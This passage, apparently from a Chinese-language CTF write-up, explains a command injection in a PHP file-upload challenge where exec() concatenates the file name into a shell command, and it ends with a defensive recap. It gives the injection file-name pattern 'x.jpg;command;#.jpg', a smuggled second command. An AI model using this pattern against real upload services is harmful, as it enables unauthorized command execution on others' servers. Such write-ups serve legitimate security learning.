+</span></span><span class="line"><span class="cl"><span class="n">exec</span><span class="p">(</span><span class="s2">&#34;file &#34;</span> <span class="o">.</span> <span class="o">$</span><span class="n">file</span> <span class="o">.</span> <span class="s2">&#34; 2&gt;&amp;1&#34;</span><span class="p">,</span> <span class="o">$</span><span class="n">details</span><span class="p">,</span> <span class="o">$</span><span class="n">status</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>文件名未经任何过滤直接拼接进 shell 命令。后端只校验扩展名为 <code>.jpg</code>，但文件名中可以包含 shell 元字符</p>
+<p>利用分号 <code>;</code> 作为命令分隔符注入命令。文件名格式为 <code>x.jpg;要执行的命令;#.jpg</code>，其中：</p>
+<ul>
+<li><code>x.jpg</code> 满足扩展名校验</li>
+<li><code>;</code> 分隔出新命令</li>
+<li><code>#</code> 注释掉后面的 <code>.jpg 2&gt;&amp;1</code></li>
+</ul>
+<p>通过注入 <code>ls -la</code> 发现目录下有 <code>pigeon_cat.php</code> 文件，读取该文件获得 flag：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{2f3dfdf9-33c7-48e5-99fe-91973754ef8e}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>复盘</strong>：这题考的是命令注入。<code>exec()</code> 函数直接拼接用户输入的文件名到 shell 命令中，没有任何过滤。后端只校验了文件扩展名，没有对文件名内容做安全检查。防御时应使用 <code>escapeshellarg()</code> 对用户输入进行转义，或者使用白名单只允许字母数字和点号</p>
+<h2 id="ezsql">EZSQL
 </h2><h3 id="ezsql-1">EZSQL
 </h3><h3 id="ezsql_1">EZSQL_1
 </h3><h3 id="ezsql_2">EZSQL_2
